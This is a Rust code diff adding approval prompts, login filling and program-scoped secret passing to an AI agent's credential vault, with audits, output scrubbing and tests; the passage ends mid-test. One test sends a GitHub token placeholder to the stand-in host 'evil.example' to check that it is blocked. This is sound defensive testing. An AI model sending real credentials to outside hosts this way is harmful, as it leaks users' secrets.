@@ -12,13 +12,19 @@
 //! - every app action's output, and every saved chat, is scrubbed for the
 //!   values and for well-known secret formats (`redact`);
 //! - each use or refusal is audited by name, chat, action and host.
+//!
+//! Settings > Vault is where the user keeps values for every chat: API keys
+//! and logins (a password with its username). A saved value set to "ask"
+//! waits for the user's approval in the chat before each use, once or for
+//! the rest of that chat.
 
 mod http;
 mod redact;
+mod run;
 mod vault;
 
 use std::collections::HashMap;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Mutex;
 use std::time::Duration;
@@ -35,18 +41,31 @@ const KEYCHAIN_SERVICE: &str = "com.irgatos.desktop.secrets";
 const KEYCHAIN_ACCOUNT: &str = "vault-key";
 pub const REQUEST_EVENT: &str = "secrets:request";
 pub const CHANGED_EVENT: &str = "secrets:changed";
+pub const APPROVAL_EVENT: &str = "secrets:approval";
+const KINDS: [&str; 2] = ["key", "login"];
+const POLICIES: [&str; 2] = ["free", "ask"];
 pub const DEFAULT_TTL_HOURS: u32 = 24;
 const MAX_TTL_HOURS: u32 = 24 * 7;
 const MAX_VALUE_CHARS: usize = 16_384;
 const MAX_HOSTS: usize = 8;
 
-pub const AGENT_ACTIONS: [&str; 3] = ["secrets.request", "secrets.list", "secrets.http"];
+pub const AGENT_ACTIONS: [&str; 5] = [
+    "secrets.request",
+    "secrets.list",
+    "secrets.http",
+    "secrets.run",
+    "secrets.login",
+];
 
 /// The open vault and the values in use, decrypted once so output can be
 /// scrubbed without asking the Keychain again.
 struct Loaded {
     vault: Vault,
     values: Vec<(SecretMeta, Zeroizing<String>)>,
+    /// Approvals the user gave for "ask" values, by (secret id, chat): true
+    /// for one use, false for the rest of the chat. Kept in memory only, so
+    /// a restart asks again.
+    grants: HashMap<(String, String), bool>,
 }
 
 impl Loaded {
@@ -54,6 +73,7 @@ impl Loaded {
         let mut loaded = Self {
             vault,
             values: Vec::new(),
+            grants: HashMap::new(),
         };
         loaded.reload(now)?;
         Ok(loaded)
@@ -72,6 +92,34 @@ impl Loaded {
         }
         self.values = values;
         Ok(())
+    }
+
+    /// The saved values among `names` that wait for the user's approval
+    /// before this chat may use them.
+    fn awaiting_approval(&self, session_id: &str, names: &[String]) -> Vec<SecretMeta> {
+        names
+            .iter()
+            .filter_map(|name| self.visible(session_id, name))
+            .map(|(meta, _)| meta)
+            .filter(|meta| {
+                meta.persistent()
+                    && meta.policy == "ask"
+                    && !self
+                        .grants
+                        .contains_key(&(meta.id.clone(), session_id.to_string()))
+            })
+            .cloned()
+            .collect()
+    }
+
+    /// Spends one-use approvals once a value has gone out.
+    fn spend_grants(&mut self, session_id: &str, used: &[SecretMeta]) {
+        for meta in used {
+            let key = (meta.id.clone(), session_id.to_string());
+            if self.grants.get(&key) == Some(&true) {
+                self.grants.remove(&key);
+            }
+        }
     }
 
     fn plain_values(&self) -> Vec<&str> {
@@ -253,6 +301,7 @@ pub fn init(app: &AppHandle) {
 /// A chat was archived or deleted: its values end with it.
 pub fn end_session(app: &AppHandle, session_id: &str) {
     let result = with_existing(app, false, |loaded| {
+        loaded.grants.retain(|(_, chat), _| chat != session_id);
         let gone = loaded.vault.end_session(session_id)?;
         for meta in &gone {
             let _ = loaded
@@ -312,6 +361,38 @@ fn hosts(input: &[String]) -> Result<Vec<String>, String> {
         let host = http::normalize_host(host)?;
         if !out.contains(&host) {
             out.push(host);
+        }
+    }
+    Ok(out)
+}
+
+/// Hosts for a saved value: one it is only handed to programs may have none.
+fn hosts_unless_commands(input: &[String], commands: &[String]) -> Result<Vec<String>, String> {
+    if input.is_empty() && !commands.is_empty() {
+        return Ok(Vec::new());
+    }
+    hosts(input)
+}
+
+fn programs(input: &[String]) -> Result<Vec<String>, String> {
+    if input.len() > run::MAX_COMMANDS {
+        return Err(format!("Name at most {} programs", run::MAX_COMMANDS));
+    }
+    let mut out: Vec<String> = Vec::new();
+    for program in input {
+        let program = program.trim();
+        if !run::valid_program(program) {
+            return Err(format!(
+                "{program} is not a program name: give bare names such as gh or psql"
+            ));
+        }
+        if run::interpreter(program) {
+            return Err(format!(
+                "{program} runs any script it is given, so it cannot hold a secret"
+            ));
+        }
+        if !out.iter().any(|p| p == program) {
+            out.push(program.to_string());
         }
     }
     Ok(out)
@@ -382,8 +463,17 @@ fn meta_for_agent(meta: &SecretMeta) -> Value {
         "name": meta.name,
         "placeholder": format!("{{{{secret:{}}}}}", meta.name),
         "label": meta.label,
+        "description": meta.description,
+        "kind": meta.kind,
+        "username": (meta.kind == "login").then_some(meta.username.as_str()),
+        "access": if meta.persistent() && meta.policy == "ask" {
+            "the user approves each use in this chat"
+        } else {
+            "free within its limits"
+        },
         "hosts": meta.hosts,
         "allowIn": meta.allow_in,
+        "commands": meta.commands,
         "purpose": meta.purpose,
         "usesLeft": meta.max_uses.map(|max| max.saturating_sub(meta.uses)),
         "expiresAt": meta.expires_at,
@@ -403,7 +493,7 @@ fn list_core(loaded: &Loaded, session_id: &str) -> Value {
         .collect();
     json!({
         "secrets": secrets,
-        "note": "Use a secret only as its placeholder in app secrets.http. You cannot read values; ask for a missing one with secrets.request.",
+        "note": "Use a secret only as its placeholder: in app secrets.http for its hosts, or in the env of app secrets.run for the programs in its commands. You cannot read values; ask for a missing one with secrets.request.",
     })
 }
 
@@ -421,12 +511,24 @@ struct Outgoing {
     max_chars: usize,
 }
 
+/// A checked agent call: ready to go out, or valid but waiting on the user
+/// for ask-first values. Refusals are errors, so nothing invalid is ever
+/// put to the user for approval.
+enum Checked<T> {
+    Ready(T),
+    Approval {
+        waiting: Vec<SecretMeta>,
+        method: String,
+        target: String,
+    },
+}
+
 fn http_prepare(
     loaded: &mut Loaded,
     session_id: &str,
     input: &Value,
     at: i64,
-) -> Result<Outgoing, String> {
+) -> Result<Checked<Outgoing>, String> {
     let input: http::HttpInput =
         serde_json::from_value(input.clone()).map_err(|e| format!("secrets.http: {e}"))?;
     let template = http::template(input)?;
@@ -454,22 +556,32 @@ fn http_prepare(
         chosen.push(meta.clone());
         values.insert(name.clone(), value.clone());
     }
+    let names: Vec<String> = template.uses.keys().cloned().collect();
+    let waiting = loaded.awaiting_approval(session_id, &names);
+    if !waiting.is_empty() {
+        return Ok(Checked::Approval {
+            waiting,
+            method,
+            target: host,
+        });
+    }
     let prepared = http::prepare(&template, &values);
     let mut spent = false;
     for meta in &chosen {
         spent |= loaded.vault.record_use(&meta.id)?;
     }
+    loaded.spend_grants(session_id, &chosen);
     if spent {
         loaded.reload(at)?;
     }
-    Ok(Outgoing {
+    Ok(Checked::Ready(Outgoing {
         prepared,
         chosen,
         sent_values: values.into_values().collect(),
         method,
         host,
         max_chars: template.max_chars,
-    })
+    }))
 }
 
 fn http_finish(
@@ -513,7 +625,12 @@ fn http_core(
     at: i64,
     send: &dyn Fn(&http::Prepared) -> Result<Value, String>,
 ) -> Result<Value, String> {
-    let outgoing = http_prepare(loaded, session_id, input, at)?;
+    let outgoing = match http_prepare(loaded, session_id, input, at)? {
+        Checked::Ready(outgoing) => outgoing,
+        Checked::Approval { waiting, .. } => {
+            return Err(format!("{} waits for the user's approval", waiting[0].name))
+        }
+    };
     let sent = send(&outgoing.prepared);
     http_finish(loaded, outgoing, sent)
 }
@@ -523,6 +640,7 @@ pub(crate) fn agent_action(
     app: &AppHandle,
     session_id: &str,
     window: &str,
+    cwd: &str,
     action: &str,
     input: &Value,
 ) -> Result<Value, String> {
@@ -557,10 +675,20 @@ pub(crate) fn agent_action(
             Ok(list_core(loaded, session_id))
         }),
         "secrets.http" => {
-            let outgoing = with_existing(app, None, |loaded| {
+            let checked = with_existing(app, None, |loaded| {
                 http_prepare(loaded, session_id, input, now()).map(Some)
             })?
             .ok_or("No secrets are saved. Ask for one with secrets.request first.")?;
+            let outgoing = match checked {
+                Checked::Ready(outgoing) => outgoing,
+                Checked::Approval {
+                    waiting,
+                    method,
+                    target,
+                } => {
+                    return ask_approval(app, session_id, window, &waiting, "secrets.http", &method, &target)
+                }
+            };
             // The vault stays unlocked while the request is out, so saving
             // chats and other calls do not wait on a slow server.
             let sent = http::send(&outgoing.prepared);
@@ -568,8 +696,301 @@ pub(crate) fn agent_action(
             changed(app);
             response
         }
+        "secrets.run" => {
+            let template = run::template(
+                serde_json::from_value(input.clone()).map_err(|e| format!("secrets.run: {e}"))?,
+            )?;
+            // A relative PATH entry such as "." would find a file in the
+            // agent's folder; only an absolute, real program counts.
+            let program = crate::harness::resolve_gui_binary(&template.program)
+                .filter(|path| path.is_absolute())
+                .and_then(|path| std::fs::canonicalize(path).ok())
+                .ok_or_else(|| format!("{} is not installed, or not on your terminal's PATH", template.program))?;
+            let checked = with_existing(app, None, |loaded| {
+                run_prepare(loaded, session_id, template, now()).map(Some)
+            })?
+            .ok_or("No secrets are saved. Ask for one with secrets.request first.")?;
+            let outgoing = match checked {
+                Checked::Ready(running) => running,
+                Checked::Approval { waiting, target, .. } => {
+                    return ask_approval(app, session_id, window, &waiting, "secrets.run", "", &target)
+                }
+            };
+            let finished = run::run(&program, &outgoing.template, &outgoing.env, Path::new(cwd));
+            let response = with_loaded(app, |loaded| run_finish(loaded, outgoing, finished));
+            changed(app);
+            response
+        }
+        "secrets.login" => {
+            let input: LoginInput = serde_json::from_value(input.clone())
+                .map_err(|e| format!("secrets.login: {e}"))?;
+            let url = crate::browser_agent::page_url(app, window)?;
+            let target = page_target(&url)?;
+            let checked = with_existing(app, None, |loaded| {
+                login_prepare(loaded, session_id, &input.name, &target, input.purpose.as_deref(), now()).map(Some)
+            })?
+            .ok_or("No secrets are saved. The user can add a login in Settings > Vault.")?;
+            let login = match checked {
+                Checked::Ready(login) => login,
+                Checked::Approval { waiting, target, .. } => {
+                    return ask_approval(app, session_id, window, &waiting, "secrets.login", "", &target)
+                }
+            };
+            let filled = crate::browser_agent::fill_login(
+                app,
+                window,
+                &login.meta.username,
+                &login.password,
+                &login.meta.hosts,
+                input.submit.unwrap_or(true),
+            );
+            let response = with_loaded(app, |loaded| {
+                let detail = match &filled {
+                    Ok(result) => result
+                        .get("filled")
+                        .and_then(Value::as_array)
+                        .map(|f| format!("filled {}", f.iter().filter_map(Value::as_str).collect::<Vec<_>>().join(" and ")))
+                        .unwrap_or_else(|| "filled".into()),
+                    Err(_) => "not filled".into(),
+                };
+                let _ = loaded.vault.audit(&audit(&login.meta, "used", "secrets.login", "", &target.host, &detail));
+                let mut plain = loaded.plain_values();
+                plain.push(login.password.as_str());
+                let scrub = |text: &str| redact::all(text, &plain);
+                let mut result = filled.map_err(|error| scrub(&error))?;
+                redact::json(&mut result, &scrub);
+                Ok(result)
+            });
+            changed(app);
+            response
+        }
         _ => Err(format!("Unknown action {action}")),
     }
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields, rename_all = "camelCase")]
+struct LoginInput {
+    name: String,
+    #[serde(default)]
+    submit: Option<bool>,
+    #[serde(default)]
+    purpose: Option<String>,
+}
+
+/// The Browser page a login would go to, as a host to check.
+fn page_target(url: &str) -> Result<http::Target, String> {
+    let url = url::Url::parse(url).map_err(|_| "The Browser has no page open")?;
+    if url.scheme() != "https" {
+        return Err(format!(
+            "Logins are filled on HTTPS pages only; this page is {}",
+            url.scheme()
+        ));
+    }
+    Ok(http::Target {
+        host: url.host_str().unwrap_or_default().to_ascii_lowercase(),
+        port: url.port(),
+    })
+}
+
+struct Login {
+    meta: SecretMeta,
+    password: Zeroizing<String>,
+}
+
+fn login_prepare(
+    loaded: &mut Loaded,
+    session_id: &str,
+    name: &str,
+    target: &http::Target,
+    purpose: Option<&str>,
+    at: i64,
+) -> Result<Checked<Login>, String> {
+    let Some((meta, value)) = loaded.visible(session_id, name) else {
+        return Err(format!(
+            "{name} is not in the vault. The user can add it as a login in Settings > Vault."
+        ));
+    };
+    let (meta, password) = (meta.clone(), value.clone());
+    let refusal = if meta.kind != "login" {
+        Some(format!("{name} is an API key, not a login"))
+    } else if !meta.usable_at(at) {
+        Some(format!("{name} has expired or been used up"))
+    } else if !http::host_allowed(target, &meta.hosts) {
+        Some(format!(
+            "{name} is for {}; the Browser is on {}",
+            meta.hosts.join(", "),
+            target.host
+        ))
+    } else {
+        meta.purpose.as_ref().and_then(|wanted| {
+            (!purpose.is_some_and(|p| p.eq_ignore_ascii_case(wanted))).then(|| {
+                format!("{name} may only be used for \"{wanted}\"; pass \"purpose\":\"{wanted}\"")
+            })
+        })
+    };
+    if let Some(reason) = refusal {
+        let _ = loaded
+            .vault
+            .audit(&audit(&meta, "blocked", "secrets.login", "", &target.host, &reason));
+        return Err(format!("Blocked: {reason}. Nothing was filled."));
+    }
+    let waiting = loaded.awaiting_approval(session_id, &[name.to_string()]);
+    if !waiting.is_empty() {
+        return Ok(Checked::Approval {
+            waiting,
+            method: String::new(),
+            target: target.host.clone(),
+        });
+    }
+    if loaded.vault.record_use(&meta.id)? {
+        loaded.reload(at)?;
+    }
+    loaded.spend_grants(session_id, std::slice::from_ref(&meta));
+    Ok(Checked::Ready(Login { meta, password }))
+}
+
+/// A checked `secrets.run`, uses counted, ready to start.
+struct Running {
+    template: run::Template,
+    chosen: Vec<SecretMeta>,
+    env: Vec<(String, Zeroizing<String>)>,
+}
+
+fn run_prepare(
+    loaded: &mut Loaded,
+    session_id: &str,
+    template: run::Template,
+    at: i64,
+) -> Result<Checked<Running>, String> {
+    let mut chosen: Vec<SecretMeta> = Vec::new();
+    let mut env = Vec::new();
+    for (var, name) in &template.env {
+        let Some((meta, value)) = loaded.visible(session_id, name) else {
+            return Err(format!(
+                "{name} is not available to this chat: it was never saved, has expired, was revoked or used up."
+            ));
+        };
+        if let Some(reason) = run::refusal(meta, &template, at) {
+            let _ = loaded.vault.audit(&audit(
+                meta,
+                "blocked",
+                "secrets.run",
+                "",
+                &template.program,
+                &reason,
+            ));
+            return Err(format!("Blocked: {reason}. Nothing was run."));
+        }
+        if !chosen.iter().any(|m| m.id == meta.id) {
+            chosen.push(meta.clone());
+        }
+        env.push((var.clone(), value.clone()));
+    }
+    let names: Vec<String> = template.env.iter().map(|(_, name)| name.clone()).collect();
+    let waiting = loaded.awaiting_approval(session_id, &names);
+    if !waiting.is_empty() {
+        return Ok(Checked::Approval {
+            waiting,
+            method: String::new(),
+            target: template.program,
+        });
+    }
+    let mut spent = false;
+    for meta in &chosen {
+        spent |= loaded.vault.record_use(&meta.id)?;
+    }
+    loaded.spend_grants(session_id, &chosen);
+    if spent {
+        loaded.reload(at)?;
+    }
+    Ok(Checked::Ready(Running {
+        template,
+        chosen,
+        env,
+    }))
+}
+
+fn run_finish(
+    loaded: &mut Loaded,
+    running: Running,
+    finished: Result<run::Finished, String>,
+) -> Result<Value, String> {
+    let detail = match &finished {
+        Ok(done) if done.timed_out => "timed out".to_string(),
+        Ok(done) => format!("exit {}", done.code.map_or("?".into(), |c| c.to_string())),
+        Err(_) => "did not start".into(),
+    };
+    for meta in &running.chosen {
+        let _ = loaded.vault.audit(&audit(
+            meta,
+            "used",
+            "secrets.run",
+            "",
+            &running.template.program,
+            &detail,
+        ));
+    }
+    let mut plain = loaded.plain_values();
+    plain.extend(running.env.iter().map(|(_, value)| value.as_str()));
+    let scrub = |text: &str| redact::all(text, &plain);
+    // Scrubbed whole, before clipping, so a value cut at the edge cannot
+    // slip through as a fragment.
+    let mut finished = finished.map_err(|error| scrub(&error))?;
+    finished.stdout = scrub(&finished.stdout);
+    finished.stderr = scrub(&finished.stderr);
+    let mut report = run::report(&running.template, &finished);
+    redact::json(&mut report, &scrub);
+    Ok(report)
+}
+
+/// Puts an approval card in the chat for each value waiting on the user and
+/// tells the agent to end its turn; Irgatos continues it once answered.
+fn ask_approval(
+    app: &AppHandle,
+    session_id: &str,
+    window: &str,
+    waiting: &[SecretMeta],
+    action: &str,
+    method: &str,
+    target: &str,
+) -> Result<Value, String> {
+    // The cards of one call settle together: the agent hears once, after
+    // the last is answered.
+    let call_id = uuid::Uuid::new_v4().simple().to_string();
+    for meta in waiting {
+        let mut card = approval_card(session_id, meta, action, method, target);
+        card["callId"] = json!(call_id);
+        app.emit_to(window, APPROVAL_EVENT, &card)
+            .map_err(|_| "Irgatos could not show the approval")?;
+    }
+    let names: Vec<&str> = waiting.iter().map(|meta| meta.name.as_str()).collect();
+    Ok(json!({
+        "status": "approval_pending",
+        "secrets": names,
+        "note": "The user approves each use of these in this chat. They see an approval card now. End your turn; Irgatos continues you once they answer, and then you retry the same call. Nothing was sent.",
+    }))
+}
+
+/// What an approval card shows: the secret, the action and where it goes.
+fn approval_card(
+    session_id: &str,
+    meta: &SecretMeta,
+    action: &str,
+    method: &str,
+    target: &str,
+) -> Value {
+    json!({
+        "sessionId": session_id,
+        "requestId": uuid::Uuid::new_v4().simple().to_string(),
+        "secretId": meta.id,
+        "name": meta.name,
+        "label": meta.label,
+        "kind": meta.kind,
+        "action": action,
+        "method": method,
+        "target": clip(target, 200),
+    })
 }
 
 fn list_core_empty() -> Value {
@@ -588,6 +1009,7 @@ pub struct SaveInput {
     label: String,
     #[serde(default)]
     description: String,
+    #[serde(default)]
     hosts: Vec<String>,
     #[serde(default)]
     allow_in: Vec<String>,
@@ -599,14 +1021,40 @@ pub struct SaveInput {
     persistent: bool,
     #[serde(default)]
     ttl_hours: Option<u32>,
+    #[serde(default)]
+    kind: Option<String>,
+    #[serde(default)]
+    username: String,
+    #[serde(default)]
+    policy: Option<String>,
+    #[serde(default)]
+    commands: Vec<String>,
+    /// From the vault screen's Add: refuse a name already saved rather than
+    /// replace its value, as asking again in a chat does.
+    #[serde(default)]
+    create_only: bool,
     value: Zeroizing<String>,
 }
 
-fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMeta, String> {
-    if !valid_name(&input.name) {
-        return Err("The name must look like STRIPE_KEY".into());
-    }
-    let value = Zeroizing::new(input.value.trim().to_string());
+fn kind(input: Option<&str>) -> Result<String, String> {
+    let kind = input.unwrap_or("key");
+    KINDS
+        .contains(&kind)
+        .then(|| kind.to_string())
+        .ok_or_else(|| format!("kind takes {}", KINDS.join(", ")))
+}
+
+fn policy(input: Option<&str>) -> Result<String, String> {
+    let policy = input.unwrap_or("free");
+    POLICIES
+        .contains(&policy)
+        .then(|| policy.to_string())
+        .ok_or_else(|| format!("policy takes {}", POLICIES.join(", ")))
+}
+
+/// A value as the vault takes it: trimmed, and within its size.
+fn checked_value(value: &str) -> Result<Zeroizing<String>, String> {
+    let value = Zeroizing::new(value.trim().to_string());
     let chars = value.chars().count();
     if !(redact::MIN_VALUE_CHARS..=MAX_VALUE_CHARS).contains(&chars) || value.contains('\0') {
         return Err(format!(
@@ -614,11 +1062,32 @@ fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMet
             redact::MIN_VALUE_CHARS
         ));
     }
+    Ok(value)
+}
+
+fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMeta, String> {
+    if !valid_name(&input.name) {
+        return Err("The name must look like STRIPE_KEY".into());
+    }
+    let value = checked_value(&input.value)?;
+    if input.create_only
+        && input.persistent
+        && loaded
+            .values
+            .iter()
+            .any(|(meta, _)| meta.persistent() && meta.name == input.name)
+    {
+        return Err(format!(
+            "{} is already in the vault. Edit it, or pick another name.",
+            input.name
+        ));
+    }
     let session_id = match (input.persistent, input.session_id) {
         (true, _) => None,
         (false, Some(id)) if !id.trim().is_empty() => Some(id),
         (false, _) => return Err("A value not saved for every chat needs its chat".into()),
     };
+    let commands = programs(&input.commands)?;
     let ttl = input
         .ttl_hours
         .unwrap_or(DEFAULT_TTL_HOURS)
@@ -630,7 +1099,7 @@ fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMet
         name: input.name,
         description: clip(&input.description, 300),
         session_id,
-        hosts: hosts(&input.hosts)?,
+        hosts: hosts_unless_commands(&input.hosts, &commands)?,
         allow_in: places(Some(&input.allow_in))?,
         purpose: input
             .purpose
@@ -638,6 +1107,10 @@ fn save_core(loaded: &mut Loaded, input: SaveInput, at: i64) -> Result<SecretMet
             .filter(|p| !p.is_empty()),
         max_uses: input.once.then_some(1),
         expires_at: (!input.persistent).then(|| at + i64::from(ttl) * 3_600_000),
+        kind: kind(input.kind.as_deref())?,
+        username: clip(&input.username, 200),
+        policy: policy(input.policy.as_deref())?,
+        commands,
     };
     let meta = loaded.vault.insert(&secret, &value, at)?;
     let _ = loaded.vault.audit(&audit(&meta, "saved", "", "", "", ""));
@@ -650,6 +1123,130 @@ pub fn secrets_save(app: AppHandle, input: SaveInput) -> Result<SecretMeta, Stri
     let meta = with_loaded(&app, |loaded| save_core(loaded, input, now()))?;
     changed(&app);
     Ok(meta)
+}
+
+/// An edit from the vault screen. `value` is left out to keep the current
+/// one. No `Debug`, as with `SaveInput`.
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields, rename_all = "camelCase")]
+pub struct UpdateInput {
+    id: String,
+    name: String,
+    #[serde(default)]
+    label: String,
+    #[serde(default)]
+    description: String,
+    #[serde(default)]
+    hosts: Vec<String>,
+    #[serde(default)]
+    allow_in: Vec<String>,
+    #[serde(default)]
+    purpose: Option<String>,
+    #[serde(default)]
+    kind: Option<String>,
+    #[serde(default)]
+    username: String,
+    #[serde(default)]
+    policy: Option<String>,
+    #[serde(default)]
+    commands: Vec<String>,
+    #[serde(default)]
+    value: Option<Zeroizing<String>>,
+}
+
+fn update_core(loaded: &mut Loaded, input: UpdateInput, at: i64) -> Result<SecretMeta, String> {
+    if !valid_name(&input.name) {
+        return Err("The name must look like STRIPE_KEY".into());
+    }
+    let current = loaded
+        .vault
+        .get(&input.id)?
+        .ok_or("The secret is no longer available")?;
+    let value = input
+        .value
+        .as_deref()
+        .filter(|value| !value.trim().is_empty())
+        .map(|value| checked_value(value))
+        .transpose()?;
+    let commands = programs(&input.commands)?;
+    let secret = NewSecret {
+        label: Some(clip(&input.label, 80))
+            .filter(|l| !l.is_empty())
+            .unwrap_or_else(|| input.name.clone()),
+        name: input.name,
+        description: clip(&input.description, 300),
+        session_id: current.session_id.clone(),
+        hosts: hosts_unless_commands(&input.hosts, &commands)?,
+        allow_in: places(Some(&input.allow_in))?,
+        purpose: input
+            .purpose
+            .map(|p| clip(&p, 60))
+            .filter(|p| !p.is_empty()),
+        max_uses: current.max_uses,
+        expires_at: current.expires_at,
+        kind: kind(input.kind.as_deref())?,
+        username: clip(&input.username, 200),
+        policy: policy(input.policy.as_deref())?,
+        commands,
+    };
+    let meta = loaded
+        .vault
+        .update(&input.id, &secret, value.as_deref().map(String::as_str), at)?;
+    let detail = if value.is_some() { "value replaced" } else { "" };
+    let _ = loaded.vault.audit(&audit(&meta, "edited", "", "", "", detail));
+    loaded.reload(at)?;
+    Ok(meta)
+}
+
+#[tauri::command(async)]
+pub fn secrets_update(app: AppHandle, input: UpdateInput) -> Result<SecretMeta, String> {
+    let meta = with_loaded(&app, |loaded| update_core(loaded, input, now()))?;
+    changed(&app);
+    Ok(meta)
+}
+
+/// The user's answer on an approval card.
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields, rename_all = "camelCase")]
+pub struct ApprovalInput {
+    secret_id: String,
+    session_id: String,
+    /// "once", "chat" or "deny".
+    answer: String,
+}
+
+fn approve_core(loaded: &mut Loaded, input: ApprovalInput) -> Result<(), String> {
+    let meta = loaded
+        .vault
+        .get(&input.secret_id)?
+        .ok_or("The secret is no longer in the vault")?;
+    let key = (meta.id.clone(), input.session_id.clone());
+    let (outcome, detail) = match input.answer.as_str() {
+        "once" => {
+            loaded.grants.insert(key, true);
+            ("approved", "once")
+        }
+        "chat" => {
+            loaded.grants.insert(key, false);
+            ("approved", "for this chat")
+        }
+        "deny" => {
+            loaded.grants.remove(&key);
+            ("denied", "")
+        }
+        _ => return Err("answer takes once, chat or deny".into()),
+    };
+    let mut entry = audit(&meta, outcome, "", "", "", detail);
+    entry.session_id = Some(input.session_id);
+    let _ = loaded.vault.audit(&entry);
+    Ok(())
+}
+
+#[tauri::command(async)]
+pub fn secrets_approve(app: AppHandle, input: ApprovalInput) -> Result<(), String> {
+    with_existing(&app, (), |loaded| approve_core(loaded, input))?;
+    changed(&app);
+    Ok(())
 }
 
 #[tauri::command(async)]
@@ -943,5 +1540,202 @@ mod tests {
         let mut blocks = json!([{"role": "user", "text": format!("my key is {STRIPE}")}]);
         redact::json(&mut blocks, &|text| redact::values(text, &[STRIPE]));
         assert!(!blocks.to_string().contains(STRIPE));
+    }
+
+    #[test]
+    fn ask_values_wait_for_approval_once_or_for_the_chat() {
+        let mut loaded = loaded();
+        let meta = save(
+            &mut loaded,
+            json!({"persistent": true, "name": "GH_TOKEN", "hosts": ["api.github.com"],
+                   "policy": "ask", "value": "saved-FAKE-token"}),
+        );
+        let request = json!({"url": "https://api.github.com/user", "headers": {"Authorization": "token {{secret:GH_TOKEN}}"}});
+        let names = vec!["GH_TOKEN".to_string()];
+        assert_eq!(loaded.awaiting_approval("chat-1", &names).len(), 1);
+        let error = http_core(&mut loaded, "chat-1", &request, 2_000, &never).unwrap_err();
+        assert!(error.contains("approval"), "{error}");
+
+        let answer = |loaded: &mut Loaded, chat: &str, answer: &str| {
+            approve_core(
+                loaded,
+                ApprovalInput {
+                    secret_id: meta.id.clone(),
+                    session_id: chat.into(),
+                    answer: answer.into(),
+                },
+            )
+            .unwrap()
+        };
+        // Once: one request goes out, the next one asks again.
+        answer(&mut loaded, "chat-1", "once");
+        let sent = RefCell::new(Vec::new());
+        http_core(&mut loaded, "chat-1", &request, 2_000, &echo(&sent)).unwrap();
+        assert!(http_core(&mut loaded, "chat-1", &request, 2_000, &never).is_err());
+
+        // For the chat: every request in it, none in another chat.
+        answer(&mut loaded, "chat-1", "chat");
+        http_core(&mut loaded, "chat-1", &request, 2_000, &echo(&sent)).unwrap();
+        http_core(&mut loaded, "chat-1", &request, 2_000, &echo(&sent)).unwrap();
+        assert_eq!(sent.borrow().len(), 3);
+        assert!(http_core(&mut loaded, "chat-2", &request, 2_000, &never).is_err());
+
+        // A request that would be refused anyway is not put to the user.
+        let elsewhere = json!({"url": "https://evil.example/", "headers": {"X": "{{secret:GH_TOKEN}}"}});
+        let error = http_core(&mut loaded, "chat-2", &elsewhere, 2_000, &never).unwrap_err();
+        assert!(error.starts_with("Blocked"), "{error}");
+
+        // The vault screen's Add does not replace a saved value.
+        let again: SaveInput = serde_json::from_value(json!({"persistent": true, "createOnly": true,
+            "name": "GH_TOKEN", "hosts": ["api.github.com"], "value": "other-FAKE-token"}))
+        .unwrap();
+        assert!(save_core(&mut loaded, again, 2_000).unwrap_err().contains("already in the vault"));
+        assert_eq!(&*loaded.vault.reveal(&meta.id).unwrap(), "saved-FAKE-token");
+
+        // Deny takes it back.
+        answer(&mut loaded, "chat-1", "deny");
+        assert!(http_core(&mut loaded, "chat-1", &request, 2_000, &never).is_err());
+        let outcomes: Vec<String> = loaded
+            .vault
+            .audit_list(50)
+            .unwrap()
+            .into_iter()
+            .map(|e| e.outcome)
+            .collect();
+        assert!(outcomes.contains(&"approved".to_string()));
+        assert!(outcomes.contains(&"denied".to_string()));
+    }
+
+    #[test]
+    fn free_and_chat_values_never_ask() {
+        let mut loaded = loaded();
+        stripe(&mut loaded);
+        save(
+            &mut loaded,
+            json!({"persistent": true, "name": "FREE_KEY", "hosts": ["api.stripe.com"], "value": "free-FAKE-value"}),
+        );
+        let names = vec!["STRIPE_KEY".to_string(), "FREE_KEY".to_string()];
+        assert!(loaded.awaiting_approval("chat-1", &names).is_empty());
+    }
+
+    #[test]
+    fn vault_edits_keep_the_value_and_logins_show_their_username() {
+        let mut loaded = loaded();
+        let meta = save(
+            &mut loaded,
+            json!({"persistent": true, "name": "GITHUB_LOGIN", "kind": "login", "username": "turel",
+                   "hosts": ["github.com"], "value": "FAKE-password-1"}),
+        );
+        let list = list_core(&loaded, "chat-1").to_string();
+        assert!(list.contains("\"username\":\"turel\""), "{list}");
+        assert!(!list.contains("FAKE-password-1"));
+        let edited = update_core(
+            &mut loaded,
+            serde_json::from_value(json!({"id": meta.id, "name": "GITHUB_LOGIN", "kind": "login",
+                "username": "wegvon", "hosts": ["github.com", "api.github.com"], "policy": "ask"}))
+            .unwrap(),
+            3_000,
+        )
+        .unwrap();
+        assert_eq!(edited.hosts, vec!["github.com", "api.github.com"]);
+        assert_eq!(&*loaded.vault.reveal(&meta.id).unwrap(), "FAKE-password-1");
+        assert!(update_core(
+            &mut loaded,
+            serde_json::from_value(json!({"id": meta.id, "name": "GITHUB_LOGIN", "hosts": ["github.com"],
+                "kind": "note"})).unwrap(),
+            3_000,
+        )
+        .is_err());
+        assert!(save_core(
+            &mut loaded,
+            serde_json::from_value(json!({"persistent": true, "name": "X_KEY", "hosts": ["a.com"],
+                "policy": "sometimes", "value": "abcdef"})).unwrap(),
+            1,
+        )
+        .is_err());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn run_gives_the_value_only_to_allowed_programs_and_scrubs_output() {
+        let mut loaded = loaded();
+        save(
+            &mut loaded,
+            json!({"persistent": true, "name": "GH_TOKEN", "commands": ["printenv"], "value": "FAKE-gh-token-123"}),
+        );
+        let template = |command: Value| {
+            run::template(
+                serde_json::from_value(json!({"command": command, "env": {"GH_TOKEN": "{{secret:GH_TOKEN}}"}}))
+                    .unwrap(),
+            )
+            .unwrap()
+        };
+        // A program the user did not name is refused before anything runs.
+        let refused = run_prepare(&mut loaded, "chat-1", template(json!(["gh", "api"])), 2_000);
+        assert!(refused.err().unwrap().contains("may only be given to printenv"));
+
+        let running = run_prepare(
+            &mut loaded,
+            "chat-1",
+            template(json!(["printenv", "GH_TOKEN"])),
+            2_000,
+        )
+        .unwrap();
+        let Checked::Ready(running) = running else {
+            panic!("a free value needs no approval")
